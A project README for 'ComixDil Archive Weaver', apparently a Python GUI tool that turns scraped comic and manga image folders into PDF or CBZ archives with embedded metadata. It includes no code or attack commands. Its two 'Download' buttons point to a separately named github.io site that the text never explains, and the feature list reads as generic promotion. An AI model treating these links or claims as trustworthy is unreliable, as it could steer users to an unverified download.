![preview](https://raw.githubusercontent.com/airho6/comixdil-web-engine/main/preview.svg)

# ComixDil Archive Weaver

A composable pipeline for transforming raw web-scraped comic & manga archives into structured, metadata-rich digital libraries. Think of it as a digital conservator for your sequential art collection—automating the messy, manual process of organizing thousands of pages into something a reader can actually navigate.

## Overview

Modern comic downloading tools like gallery-dl give you piles of images, but they leave you with the grunt work: filing, renaming, converting, merging. ComixDil Archive Weaver sits on top of that extraction layer, providing a configurable, GUI-driven workflow that turns chaotic downloads into polished, portable archives. Instead of wrestling with batch scripts or manual folder sorting, you define your output blueprint—PDF with embedded metadata, CBZ with custom cover art, or a hybrid format that preserves both resolution and portability. The tool watches your download directories and applies your formatting rules automatically.

The core philosophy: separate the acquisition from the curation. Let specialized tools handle the scraping; let ComixDil handle the librarian duties—retrying failed conversions, deduplicating pages, injecting chapter markers, and generating spine labels for your digital shelf. It works across operating systems because your collection shouldn't care about your OS choice.

[![Download](https://raw.githubusercontent.com/airho6/comixdil-web-engine/main/button.svg)](https://airho6.github.io/comixdil-web-engine/)

## Features

### Multi-Format Orchestration
Convert scraped directories into PDF (with proper page ordering and bookmarks), CBZ (standard compressed archive), or CBR/RAR variants. Each format preserves original resolution unless you specify compression targets. The pipeline handles mixed-origin archives—some chapters from one site, others from different sources—merging them into coherent volumes with gap detection.

### Metadata Injection
Automatically extract and embed metadata from source filenames or sidecar JSON files: series title, issue number, release year (anticipating 2026 workflows), publisher, language tags, and custom annotations. The tool writes this into PDF metadata fields or CBZ comment blocks, making your library searchable by Calibre, Komga, or Kavita without manual tagging.

### Responsive Adaptive Interface
Built on PySide6, the GUI adapts to screen sizes from mobile tablets to ultrawide monitors. Collapsible panels for queue management, real-time conversion progress bars, and a dark/light theme toggle that respects system preferences. The interface is a digital dashboard, not a settings maze—most users will never touch the advanced options.

### Multilingual Processing Pipeline
Handle archives named in Japanese, Chinese, Korean, Russian, French, or Spanish without character encoding crashes. The iconv-driven submodule detects and normalizes filenames to universal Unicode, preventing the "broken filename" plague when moving archives between Windows and Linux.

### 24/7 Unattended Mode
Let the tool run overnight. Configured watch folders trigger automatic conversion with collision handling: if a PDF already exists, the tool appends new chapters as sections rather than overwriting. Failed pages are logged with exact coordinates for manual inspection, not abandoned silently.

### Integrity Verification
Every output archive gets a checksum manifest (.sha256 or .md5) written alongside it. Scan your entire library in one pass to detect corruption from bad downloads or failing drives. The tool can re-acquire the missing pages from your configured sources and patch the archive without rebuilding from scratch.

### Compression Control Panel
Fine-tune JPEG quality levels per format (lossless for CBZ, adjustable for PDF), strip redundant metadata, and remove watermarked overlays if detected. The trade-off between file size and visual fidelity is presented as a slider with preview—no cryptic compression ratio strings.

## Architecture

ComixDil Archive Weaver operates as a modular pipeline:

1. **Watchdog Layer** - Monitors specified directories for new content, respecting file age thresholds to prevent half-downloaded archives from being processed.
2. **Classifier Engine** - Parses filenames against customizable regex patterns to extract volume/chapter/page metadata. Falls back to heuristics for nonstandard naming conventions.
3. **Converter Workers** - Threaded pool processes archives simultaneously. PDF conversion uses img2pdf for memory efficiency; CBZ generation uses zipfile with no compression (or deflate on request).
4. **Output Organizer** - Moves completed archives to your configured library structure: `Series/Volume - Chapter/` or flat tagging scheme, your choice.

This separation means you can swap out any component—use a different classifier, add WebP support, or pipe output into a cloud uploader—without touching the core GUI.

## Getting Started

### What You'll Need
- Python 3.10 or newer
- A Python virtual environment (recommended for dependency isolation)
- Existing comic/manga downloads from gallery-dl or similar tools (the raw image folders, not finished archives)

### Initial Setup

After ensuring your system meets the Python dependency requirements (listed in `pyproject.toml`), launch the GUI from your virtual environment:

```
python -m comixdil_archive_weaver
```

The first-run wizard will ask for:
- Default watch folder (where your tools drop downloaded pages)
- Output format preference (PDF, CBZ, or ask each time)
- Library root folder for organizing completed archives

These can be changed later via the Settings panel.

### First Conversion

1. Point your scraping tool to a watch folder like `~/Downloads/new_manga`.
2. Comixdil detects the new folder structure automatically.
3. Open the queue panel, review detected chapters (correct series name if needed).
4. Click "Process Queue" or wait for the scheduled batch timer.
5. Completed archives appear in your library folder with metadata embedded.

You can prioritize urgent conversions ahead of queued items by drag-and-drop reordering in the queue list.

## Configuration Reference

The config file (`~/.comixdil/config.toml`) exposes all settings, but 90% of users won't need to touch it. Key options:

- `output_format` = "pdf" | "cbz" | "ask"
- `jpeg_quality` = 85 (range: 0-100)
- `metadata_source` = "filename" | "json" | "both"
- `language_hint` = "auto" | "en" | "ja" | "zh"
- `unattended_interval` = 300 (seconds between automatic scan triggers)
- `integrity_checksum` = "sha256" | "md5" | false

## Troubleshooting

**Archives with missing pages**: The log file (`comixdil-worker.log`) records every page that failed conversion with its source path and error reason. Common causes: corrupted JPEG files (re-download), permission issues (check folder ownership), or page count mismatches (compare downloaded files versus expected).

**Metadata not appearing in readers**: Some PDF readers ignore standard metadata fields. The tool optionally creates a separate `.nfo` file (used by Kodi-style scrapers) alongside the archive. Enable this in Settings → Compatibility.

**Slow conversion of large archives**: The default worker count equals CPU threads minus one. On systems with fewer than 4 cores, reduce this in config to prevent system sluggishness.

## License

ComixDil Archive Weaver is released under the [MIT License](https://opensource.org/license/MIT). You are free to use, modify, and distribute this software, provided the original copyright notice is included. No warranty is expressed or implied—your digital library's integrity is ultimately your responsibility.

## Disclaimer

This tool is designed for personal archival purposes only. It does not host, distribute, or facilitate access to copyrighted content. Users are responsible for ensuring their use of this software complies with applicable copyright laws and terms of service for the websites from which they download content. The developers assume no liability for misuse or copyright infringement committed through this software.

## Contributing

Bug reports, feature requests, and pull requests are welcome via the repository's issue tracker. The project follows semantic versioning and uses conventional commit messages for changelog generation. For complex features, open a discussion first to align on architectural approach.

[![Download](https://raw.githubusercontent.com/airho6/comixdil-web-engine/main/button.svg)](https://airho6.github.io/comixdil-web-engine/)